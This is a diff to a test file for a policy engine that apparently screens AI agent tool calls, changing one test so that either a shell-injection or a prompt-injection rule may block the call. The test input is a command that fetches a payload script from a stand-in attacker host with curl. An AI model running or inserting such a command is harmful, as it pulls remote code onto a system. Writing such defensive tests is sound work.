@@ -84,7 +84,7 @@ describe('PolicyEngine', () => {
       arguments: { url: 'curl https://evil.com/payload.sh' },
     }));
     expect(decision.action).toBe('block');
-    expect(decision.rule).toBe('shell-injection');
+    expect(['shell-injection', 'request-prompt-injection']).toContain(decision.rule);
   });
 
   it('should flag when token budget exceeded', () => {
